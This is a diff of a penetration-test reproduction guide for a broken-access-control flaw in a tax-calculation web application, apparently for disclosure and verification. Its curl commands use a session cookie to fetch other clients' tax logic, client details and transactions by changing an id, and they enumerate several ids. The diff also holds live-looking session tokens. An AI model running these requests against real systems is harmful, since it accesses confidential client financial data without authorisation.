@@ -57,12 +57,12 @@ Step 1: Authenticate to the application using Ankan Bose credentials
 - Note: Your actual clientId is 98
 
 Step 2: Test Endpoint 1 - ClientTaxLogic - Accessing own data
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=98"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=98"
 - Expected: HTTP 200 (accessing your own data - this is correct)
 - Verify: Page displays tax logic configuration for your client
 
 Step 3: Test Endpoint 1 - ClientTaxLogic - Accessing other user's data (EXPLOIT)
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=30"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=30"
 - Note: Changed id parameter from 98 to 30 (Sudeep's clientId)
 - Observe: HTTP 200 response returned (VULNERABLE - should be 403)
 - Observe: Full page content with clientId=30 tax logic displayed
@@ -70,22 +70,22 @@ Step 3: Test Endpoint 1 - ClientTaxLogic - Accessing other user's data (EXPLOIT)
 - FINDING: Successfully accessed Sudeep's data with your credentials
 
 Step 4: Test Endpoint 2 - ClientSelect/ViewClient - Accessing other user's data (EXPLOIT)
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientSelect/ViewClient?clientId=30"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientSelect/ViewClient?clientId=30"
 - Observe: HTTP 200 response returned (VULNERABLE)
 - Observe: Full client details for clientId=30 displayed
 - FINDING: Successfully accessed another client's information
 
 Step 5: Test Endpoint 3 - CalcTransactions - Accessing other user's data (EXPLOIT)
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactions?id=30"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactions?id=30"
 - Observe: HTTP 200 response returned (VULNERABLE)
 - Observe: Full transaction records and calculations for clientId=30 displayed
 - FINDING: Successfully accessed another client's transaction data
 
 Step 6: Enumerate multiple client IDs (proof of systematic vulnerability)
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=1"
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=50"
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=100"
-- Execute: curl -v -b "TC-BAC-DEV=a2tyfcve2uz5p24fqivmekwa" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=741"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=1"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=50"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=100"
+- Execute: curl -v -b "TC-BAC-DEV=wr2zb2hbnyfagyiza3n2gtqt" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientTaxLogic?id=741"
 - Result: ALL requests return HTTP 200 with complete data for each client
 - Finding: Systematic vulnerability - can enumerate and access ANY numeric client ID
 
